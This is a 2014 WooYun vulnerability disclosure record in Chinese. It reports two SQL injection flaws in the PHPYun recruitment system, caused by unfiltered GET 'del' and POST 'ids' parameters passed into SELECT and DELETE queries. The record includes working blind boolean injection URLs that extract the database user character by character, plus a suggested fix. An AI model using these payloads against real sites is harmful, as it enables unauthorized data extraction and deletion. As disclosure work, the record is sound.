{"id": 49545, "wybug_id": "wooyun-2014-072716", "wybug_title": "Phpyun SQL注入两枚", "wybug_corp": "php云人才系统", "wybug_author": "zxx", "wybug_date": "2014-08-19 17:03", "wybug_open_date": "2014-11-17 17:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向公众公开  简要描述： 20140811 详细说明：  漏洞一：/member/model/com.class.php中\nfunction job(){。。。570行\t\tif($_GET['del'] || is_array($_POST['checkboxid']))\t\t{\t\t\tif(is_array($_POST['checkboxid'])){\t\t\t\t$layer_type=1;\t\t\t\t$delid=$this->pylode(\",\",$_POST['checkboxid']);\t\t\t}else if($_GET['del']){\t\t\t\t$layer_type=0;\t\t\t\t$delid=$_GET['del'];//GET的del没有过滤，传给delid\t\t\t}\t\t\t$rows=$this->obj->DB_select_all(\"company_job\",\"`uid`='\".$this->uid.\"' and `id` in (\".$delid.\")\",\"`state`\");\t\t\t$nid=$this->obj->DB_delete_all(\"company_job\",\"`uid`='\".$this->uid.\"' and `id` in (\".$delid.\")\",\" \");\t\t\techo $nid;\t\t\t$this->obj->DB_delete_all(\"company_job_link\",\"`uid`='\".$this->uid.\"' and `jobid` in (\".$delid.\")\",\" \");//上面三行都将delid直接带入。。。}function job_action(){\t$this->job();//调用job函数。。。}\n漏洞二：与漏洞一类似，/member/model/com.class.php中\nfunction delshow_action(){\t\t$company_show=$this->obj->DB_select_all(\"company_show\",\"`id` in (\".$_POST['ids'].\") and `uid`='\".$this->uid.\"'\",\"`picurl`\");\t\tif(is_array($company_show)&&$company_show){\t\t\tforeach($company_show as $val){\t\t\t\t$this->obj->unlink_pic(\".\".$val['picurl']);\t\t\t}\t\t\t$this->obj->DB_delete_all(\"company_show\",\"`id` in (\".$_POST['ids'].\") and `uid`='\".$this->uid.\"'\",\"\");\t\t}\t\treturn true;\t}\nPOST的ids直接放入sql语句中   漏洞证明：  证明一：程序有点问题，因为只要mysql_query执行delete操作只要不出错就返回true，$nid一直返回1，所以回显一直一样，我们就靠招聘信息是否删除成功来判断。当http://localhost/member/index.php?m=com&c=job&del=if(substring(user(),1,1)=char(115),3,798)) %23   //这里3为我们的招聘信息id我们的user()是root，ascii码为114，这里为115，所以信息仍存在；\n\nhttp://localhost/member/index.php?m=com&c=job&del=if(substring(user(),1,1)=char(114),3,798)) %23\n\n\n\n证明二：同样是没有回显，这里靠企业环境展示的删除与否判断：先得到一个展示的id：在删除的地方，审查元素：\n\n，这里是3http://localhost/member/index.php?c=delshowPOST：ids=if(substring(user(),1,1)=char(115),3,798)  //3就是我们得到的id这里还是因为155不是r的ascii码，所以删除失败，就不上图了。http://localhost/member/index.php?c=delshowPOST：ids=if(substring(user(),1,1)=char(114),3,798)\n\n\n\n\n\n因为360webscan的存在，好像有点鸡肋。   修复方案：  第一个GET用intval过滤第二个POST用你们的pylode过滤   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-19 17:28 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}